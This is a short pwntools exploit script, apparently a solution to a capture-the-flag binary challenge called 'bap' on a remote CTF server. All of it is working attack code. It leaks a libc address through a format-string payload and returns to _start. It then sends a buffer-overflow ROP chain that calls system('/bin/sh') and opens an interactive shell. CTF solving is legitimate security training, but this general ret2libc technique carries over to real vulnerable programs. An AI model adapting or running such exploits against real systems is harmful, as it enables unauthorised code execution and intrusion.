from pwn import *

# p = process('./bap', env={"LD_PRELOAD": "./libc.so.6"})
p = remote('challs.actf.co', 31323)
e = ELF('./bap')
libc = ELF('./libc.so.6')
context.arch = 'amd64'

payload = b'%29$p'
payload = payload.ljust(0x18, b'A')
payload += p64(e.symbols['_start'])
p.sendlineafter(b': ', payload)
libc.address = int(p.recvuntil(b'A')[:-1], 16) - libc.symbols['__libc_start_main'] - 128
log.info(f'libc: {hex(libc.address)}')

addr_pop_rdi = next(libc.search(asm('pop rdi; ret')))
addr_arg = next(libc.search(b'/bin/sh'))
payload = flat([
    b'\0'*0x18,
    addr_pop_rdi+1,
    addr_pop_rdi, addr_arg,
    libc.symbols['system']
])
p.sendlineafter(b': ', payload)
p.interactive()
